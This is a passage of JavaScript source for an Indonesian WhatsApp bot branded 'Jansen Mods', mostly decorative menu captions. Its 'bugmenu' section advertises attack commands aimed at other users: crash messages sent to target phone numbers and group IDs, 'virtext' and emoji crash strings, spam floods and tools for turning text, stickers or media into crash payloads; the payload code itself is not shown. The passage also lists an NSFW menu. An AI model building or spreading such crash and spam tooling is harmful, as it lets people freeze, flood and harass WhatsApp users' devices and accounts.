╚══╩═╝╚╝╚╝╚═╩═╩╝╚╝
─╔╦══╦═╦╦══╦═╦═╦╗✯
─║║╔╗║║║║══╣╦╣║║║✯
╔╣║╠╣║║║╠══║╩╣║║║✯
╚═╩╝╚╩╩═╩══╩═╩╩═╝✯
° Owner  : 6281364399250
° Version : NEW
° Baileys : 4.4.0
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`,
footer: jansen.user.name,
buttons: buttons,
headerType: 3
}
jansen.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'menu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
[ 🏴‍☠️ Aku Adalah Bot Jansen ]
╔══╦═╦══╗─╔╦═╦╦══╗
║╔╗║║╠╗╔╝─║║║║║╔╗║
║╔╗║║║║║╔╗║║║║║╠╣║
╚══╩═╝╚╝╚╝╚═╩═╩╝╚╝
─╔╦══╦═╦╦══╦═╦═╦╗✯
─║║╔╗║║║║══╣╦╣║║║✯
╔╣║╠╣║║║╠══║╩╣║║║✯
╚═╩╝╚╩╩═╩══╩═╩╩═╝✯
° Owner  : 6281364399250
° Version : NEW
° Baileys : 4.4.0
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Bugmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Mybug  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Infobot  
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢❍ Menu_Auto ❍
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Autoketik on / off  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Autovn on / off  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Autoavailable on / off  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Welcome on / off [ Crash ]  
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢❍ Menu Mods ❍
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Scraperimage  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Asupanmata  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Scrapconvert  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Nsfw  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Soundbot  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Funnmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Primbonmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Islamiyah  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Voicechanger  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Beritanews  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Cmdmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Searchmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Groupmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Downloadmenu  
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Ownermenu  
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
*NOTE*
🛡
contact me Wa.me/6281364399250
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ
 © ⏤͟͟͞  𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒`, contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'bugmenu': case 'mybot': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
[ 🏴‍☠️ Aku Adalah Bot Jansen ]
╔══╦═╦══╗─╔╦═╦╦══╗
║╔╗║║╠╗╔╝─║║║║║╔╗║
║╔╗║║║║║╔╗║║║║║╠╣║
╚══╩═╝╚╝╚╝╚═╩═╩╝╚╝
─╔╦══╦═╦╦══╦═╦═╦╗✯
─║║╔╗║║║║══╣╦╣║║║✯
╔╣║╠╣║║║╠══║╩╣║║║✯
╚═╩╝╚╩╩═╩══╩═╩╩═╝✯
° Owner  : 6281364399250
° Version : NEW
° Baileys : 4.4.0
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
BUG BOT VIP
BY : ${botname}
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯SPECIAL✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢verif
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢afk { kasih reactions }
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenghoib [ on / off ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenjagoan [ reply target ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensange [ Harus Menjadi Admin ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugtiktok [ Link ] - Bug Sw
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯TARGET✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🔥 628xxx|5|5
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenskuy 628x
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashmex 628xxx|5|5
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢spc 628x@s.whatsapp.net|10|10s
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cpc 628x@s.whatsapp.net|10|10s
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
Ketik > m.chat ( di group dulu )
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯GROUP✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gasjansen 112674448x
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sgc 1237891x@g.us|10|10s
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cgc 1237891x@g.us|10|10s
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BUG EMOJI✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢💀 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢👽 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢☠️ [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢️👾 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🪐 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦴 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢☝ [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢👻 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦖 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦕 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢👿 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🐉 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢⚡ [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢💥 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🔥 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌪️ [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍂 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍃 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌴 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌿 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍀 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🪵 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦥 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌳 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍁 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🎋 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥜 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌰 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥔 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🧄 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍆 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥑 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🫑 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥬 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥒 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥦 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌽 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🧅 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍠 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥕 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌶️ [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍅 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥥 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍇 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🫐 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🫒 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥝 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍐 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍏 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍈 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍋 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍌 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍍 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥭 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍊 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍑 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍉 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍎 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍒 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍓 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥀 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🐍 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦂 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌷 [ jumlah ]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BUG VIP✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen8 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen9 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen10 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen11 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen12 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen13 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen14 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen15 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen16 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen17 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen18 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen19 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen20 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen21 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen22 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen23 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen24 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen25 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen26 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen27 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen28 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen29 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen30 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen31 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen32 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen33 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen34 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen35 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen36 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen37 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen38 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen39 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen40 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen41 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen42 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen43 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen44 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen45 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen46 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen47 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen48 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen49 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen50 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen51 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen52 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen53 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen54 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen55 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen56 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen57 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen58 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen59 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen60 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢okemex [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mexcrot [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansennih [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ampunsuhu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mexdemam [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ahyangbetul [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢buttonkematian [ jumlah ]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BUG DJ✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj8 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj9 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj10 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj11 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj12 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj13 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj14 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj15 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj16 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj17 [ jumlah ]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯JADI BUG VIP✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext1 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext2 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext3 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext4 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext5 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext6 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext7 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext8 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext9 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext10 [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadikatalog [reply sticker] jumlah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jaditroli [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadijago [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadidocu [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadilokas [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugsw [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadipolling [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadidarknes [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibuginvite [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugbokep [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugbutton [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugpayment [Masukan text nya]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug1 [Video Jadi Bug Audio]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug2 [Video Jadi Bug Mp3]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug3 [Audio Jadi Bug Vn]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug4 [Sticker Jadi Bug Gambar]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug5 [Gambar Jadi Bug Once] 
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯VIRTEXT✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext8 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext9 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext10 [ jumlah ]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯SPAM✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢inibutton [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jatrol [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cumadocu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢testbutton [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bully [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢waifu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cuddle [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢neko [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cry [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kiss [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hug [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lick [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢awoo [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢yeet [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bite [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lick [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkangbuttton [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendelay [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenstik [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbugie [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢buglokas [ jumlah ]
